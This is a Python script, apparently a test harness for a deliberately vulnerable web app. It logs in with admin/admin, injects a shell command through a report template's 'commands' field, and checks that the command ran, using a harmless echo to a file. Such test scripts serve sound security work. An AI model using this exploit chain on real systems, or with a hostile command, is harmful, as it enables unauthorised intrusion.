#!/usr/bin/env python3
"""
简单的漏洞测试脚本
用于快速验证RCE漏洞是否修复成功
"""

import requests
import json
import time
from urllib.parse import urljoin

def test_rce(target_url="http://localhost:8080"):
    """测试RCE漏洞"""
    print("="*50)
    print("RCE 漏洞快速测试")
    print("="*50)
    
    session = requests.Session()
    
    # 1. 登录
    print("[1] 尝试登录...")
    login_url = urljoin(target_url, '/login')
    login_data = {'username': 'admin', 'password': 'admin'}
    
    response = session.post(login_url, data=login_data, allow_redirects=False)
    if response.status_code != 302:
        print("[-] 登录失败")
        return False
    print("[+] 登录成功")
    
    # 2. 创建恶意报告
    print("[2] 创建恶意报告...")
    create_url = urljoin(target_url, '/analytics/create')
    
    malicious_payload = {
        "data": {"type": "performance", "period": "test"},
        "template": {
            "template_type": "dynamic",
            "fields": ["cpu", "memory"],
            "commands": ["echo 'TEST_SUCCESS' > /app/static/test_result.txt"]
        }
    }
    
    form_data = {
        'title': '测试报告',
        'description': '测试RCE漏洞',
        'data': json.dumps(malicious_payload)
    }
    
    response = session.post(create_url, data=form_data)
    if response.status_code != 200:
        print("[-] 创建报告失败")
        return False
    
    result = response.json()
    if 'id' not in result:
        print("[-] 报告创建失败")
        return False
        
    report_id = result['id']
    print(f"[+] 报告创建成功 (ID: {report_id})")
    
    # 3. 触发漏洞
    print("[3] 触发漏洞...")
    view_url = urljoin(target_url, f'/analytics/{report_id}')
    response = session.get(view_url)
    
    if response.status_code != 200:
        print("[-] 触发漏洞失败")
        return False
    print("[+] 漏洞触发成功")
    
    # 4. 验证结果
    print("[4] 验证命令执行...")
    time.sleep(3)
    
    test_url = urljoin(target_url, '/static/test_result.txt')
    response = session.get(test_url)
    
    if response.status_code == 200 and 'TEST_SUCCESS' in response.text:
        print("[+] RCE 验证成功！")
        print(f"[+] 命令执行结果: {response.text.strip()}")
        return True
    else:
        print("[-] RCE 验证失败")
        print(f"    状态码: {response.status_code}")
        if response.status_code == 200:
            print(f"    响应内容: {response.text[:100]}")
        return False

if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    success = test_rce(target)
    
    if success:
        print("\n🎉 测试通过：RCE漏洞工作正常！")
        sys.exit(0)
    else:
        print("\n❌ 测试失败：RCE漏洞可能存在问题")
        sys.exit(1) 